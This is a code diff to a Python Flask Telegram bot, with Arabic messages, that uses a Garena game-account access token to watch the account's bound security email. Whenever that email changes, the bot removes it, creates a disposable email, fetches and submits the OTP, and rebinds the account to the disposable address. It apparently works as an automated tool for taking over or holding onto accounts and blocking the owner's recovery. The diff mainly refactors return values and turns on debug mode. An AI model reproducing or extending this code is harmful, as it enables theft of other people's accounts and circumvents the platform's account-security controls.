@@ -73,8 +73,8 @@ def remove_email(token):
         url = "https://100067.connect.garena.com/game/account_security/bind:cancel_request"
         payload = {'app_id': "100067", 'access_token': token}
         response = requests.post(url, data=payload, headers=COMMON_HEADERS)
-        return response.text
-    except: return "فشل الحذف"
+        return response.status_code == 200
+    except: return False
 
 def add_email(token, email):
     try:
@@ -83,16 +83,19 @@ def add_email(token, email):
         headers = COMMON_HEADERS.copy()
         headers['Accept'] = "application/json"
         response = requests.post(url, data=payload, headers=headers)
-        return response.text
-    except: return "فشل الإضافة"
+        return response.status_code == 200
+    except: return False
 
 def verify_otp(token, email, otp):
     try:
         url = "https://100067.connect.garena.com/game/account_security/bind:verify_otp"
         payload = {'app_id': '100067', 'access_token': token, 'otp': otp, 'email': email}
         response = requests.post(url, data=payload, headers=COMMON_HEADERS)
-        return response.text
-    except: return "فشل التحقق"
+        if response.status_code == 200:
+            verifier_match = re.search(r'"verifier_token":"([^"]+)"', response.text)
+            return verifier_match.group(1) if verifier_match else None
+        return None
+    except: return None
 
 def create_bind(token, email, verifier_token):
     try:
@@ -105,57 +108,69 @@ def create_bind(token, email, verifier_token):
             'email': email
         }
         response = requests.post(url, data=payload, headers=COMMON_HEADERS)
-        return response.text
-    except: return "فشل الربط"
+        return response.status_code == 200
+    except: return False
 
 def monitor_process(chat_id, target_email, token):
-    while chat_id in active_monitors and active_monitors[chat_id]:
+    last_email = None
+    processing = False
+    
+    while active_monitors.get(chat_id):
+        if processing:
+            time.sleep(3)
+            continue
+            
         try:
             current_email = get_current_email(token)
             
-            if current_email == target_email:
-                send_telegram_message(chat_id, f"✅ الإيميل صحيح: {current_email}")
-            else:
-                send_telegram_message(chat_id, f"⚠️ الإيميل مختلف: {current_email}")
-                
-                remove_response = remove_email(token)
-                send_telegram_message(chat_id, f"🗑️ حذف الإيميل: {remove_response}")
-                time.sleep(2)
-                
-                temp_email, temp_pass, temp_session = gen_temp_email()
-                if temp_email:
-                    send_telegram_message(chat_id, f"📧 إيميل جديد: {temp_email}\n🔑 كلمة السر: {temp_pass}")
-                    
-                    add_response = add_email(token, temp_email)
-                    send_telegram_message(chat_id, f"📨 إضافة الإيميل: {add_response}")
-                    
-                    if "success" in add_response.lower() or "200" in add_response:
-                        send_telegram_message(chat_id, "⏳ جاري انتظار الرمز...")
-                        
-                        for _ in range(30):
-                            if not active_monitors.get(chat_id): break
-                            otp = get_verification_code(temp_email, temp_pass, temp_session)
-                            if otp:
-                                send_telegram_message(chat_id, f"🔑 الرمز: {otp}")
-                                
-                                verify_response = verify_otp(token, temp_email, otp)
-                                send_telegram_message(chat_id, f"📨 تحقق الرمز: {verify_response}")
-                                
-                                if "verifier_token" in verify_response:
-                                    verifier_match = re.search(r'"verifier_token":"([^"]+)"', verify_response)
-                                    if verifier_match:
-                                        verifier_token = verifier_match.group(1)
-                                        bind_response = create_bind(token, temp_email, verifier_token)
-                                        send_telegram_message(chat_id, f"📨 الربط النهائي: {bind_response}")
-                                break
-                            time.sleep(10)
-                        else:
-                            send_telegram_message(chat_id, "❌ انتهى وقت انتظار الرمز")
+            if current_email != last_email:
+                if current_email == target_email:
+                    send_telegram_message(chat_id, f"✅ الإيميل المطلوب موجود: {target_email}")
                 else:
-                    send_telegram_message(chat_id, "❌ فشل إنشاء إيميل")
+                    send_telegram_message(chat_id, f"⚠️ تغيير في الإيميل: {current_email}")
+                    processing = True
+                    
+                    if remove_email(token):
+                        send_telegram_message(chat_id, "🗑️ تم حذف الإيميل السابق")
+                        time.sleep(2)
+                        
+                        temp_email, temp_pass, temp_session = gen_temp_email()
+                        if temp_email:
+                            send_telegram_message(chat_id, f"📧 إيميل جديد: {temp_email}\n🔑 كلمة السر: {temp_pass}")
+                            
+                            if add_email(token, temp_email):
+                                send_telegram_message(chat_id, "📨 تم إرسال طلب الإضافة")
+                                
+                                for _ in range(30):
+                                    if not active_monitors.get(chat_id): break
+                                    otp = get_verification_code(temp_email, temp_pass, temp_session)
+                                    if otp:
+                                        send_telegram_message(chat_id, f"🔑 تم استلام الرمز: {otp}")
+                                        
+                                        verifier_token = verify_otp(token, temp_email, otp)
+                                        if verifier_token:
+                                            if create_bind(token, temp_email, verifier_token):
+                                                send_telegram_message(chat_id, "✅ تم ربط الإيميل بنجاح")
+                                            else:
+                                                send_telegram_message(chat_id, "❌ فشل الربط النهائي")
+                                        else:
+                                            send_telegram_message(chat_id, "❌ فشل تحقق الرمز")
+                                        break
+                                    time.sleep(10)
+                                else:
+                                    send_telegram_message(chat_id, "❌ انتهى وقت انتظار الرمز")
+                            else:
+                                send_telegram_message(chat_id, "❌ فشل إضافة الإيميل")
+                        else:
+                            send_telegram_message(chat_id, "❌ فشل إنشاء إيميل مؤقت")
+                    else:
+                        send_telegram_message(chat_id, "❌ فشل حذف الإيميل السابق")
+                
+                last_email = current_email
+                processing = False
             
             time.sleep(3)
-        except Exception as e:
+        except:
             time.sleep(3)
 
 @app.route('/webhook/telegram', methods=['POST'])
@@ -175,15 +190,16 @@ def handle_telegram_webhook():
             target_email = parts[1]
             token = parts[2]
             active_monitors[chat_id] = True
+            send_telegram_message(chat_id, f"🚀 بدء المراقبة للإيميل: {target_email}")
             monitor_process(chat_id, target_email, token)
         else:
-            send_telegram_message(chat_id, "❌ /start email token")
+            send_telegram_message(chat_id, "❌ استخدم: /start email token")
     
     elif message_text == '/stop':
         active_monitors[chat_id] = False
-        send_telegram_message(chat_id, "⏹️ توقف المراقبة")
+        send_telegram_message(chat_id, "⏹️ توقفت المراقبة")
     
     return "ok", 200
 
 if __name__ == '__main__':
-        app.run()
+    app.run(debug=True, port=5000)
